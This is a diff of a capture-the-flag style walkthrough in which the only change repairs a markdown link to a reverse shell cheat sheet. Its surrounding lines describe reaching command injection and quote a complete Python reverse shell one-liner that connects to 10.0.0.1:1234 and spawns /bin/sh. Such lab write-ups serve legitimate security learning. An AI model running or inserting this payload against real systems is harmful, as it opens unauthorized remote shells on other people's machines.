@@ -113,7 +113,7 @@ AHhhh nice adding our parameter to the back boom we have command injection.
 
 ![image](https://user-images.githubusercontent.com/69868171/117458218-0ac9b800-af18-11eb-88b9-b5e61cdf09e7.png)
 
-Now let get a reverse shell back to our terminal. [Reverse Shell Cheat Sheet][https://muzec0318.github.io/posts/ReverseShell.html] 
+Now let get a reverse shell back to our terminal. [Reverse Shell Cheat Sheet](https://muzec0318.github.io/posts/ReverseShell.html) 
 
 we be using the python reverse shell script `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
